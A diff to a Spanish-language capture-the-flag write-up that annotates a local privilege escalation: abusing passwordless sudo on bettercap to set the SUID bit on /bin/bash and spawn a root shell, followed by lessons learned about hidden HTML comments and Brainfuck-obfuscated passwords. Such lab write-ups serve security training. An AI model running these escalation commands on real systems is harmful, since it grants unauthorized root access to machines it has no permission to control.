@@ -65,13 +65,16 @@ El usuario `agua` puede ejecutar `bettercap` como root sin contraseña.
 Explotación mediante abuso de bettercap para activar SUID en bash:
 
 ```bash
+# Abrir bettercap como root (comillas simples para evitar expansión de historial en bash)
 sudo bettercap -eval '!bash'
 
 # Dentro de bettercap, activar SUID en /bin/bash
 !chmod u+s /bin/bash
 
+# Salir de bettercap
 exit
 
+# Ejecutar bash con privilegios de root
 bash -p
 whoami
 # root
@@ -80,3 +83,9 @@ whoami
 ## Conclusión
 
 La máquina combina esteganografía social (nombre de imagen como pista de usuario) con ofuscación de contraseña mediante Brainfuck en el HTML. La escalada aprovecha bettercap en sudoers para activar el bit SUID en bash.
+
+**Lecciones aprendidas:**
+- Revisar siempre el código fuente HTML en busca de comentarios ocultos.
+- Los lenguajes esotéricos (Brainfuck, etc.) son un recurso habitual para ocultar contraseñas en CTFs.
+- Un binario con sudo NOPASSWD puede ser suficiente para escalar a root aunque no esté en GTFOBins — bettercap permite ejecutar comandos del sistema con `!`.
+- Usar comillas simples al pasar argumentos con `!` en bash para evitar la expansión de historial.
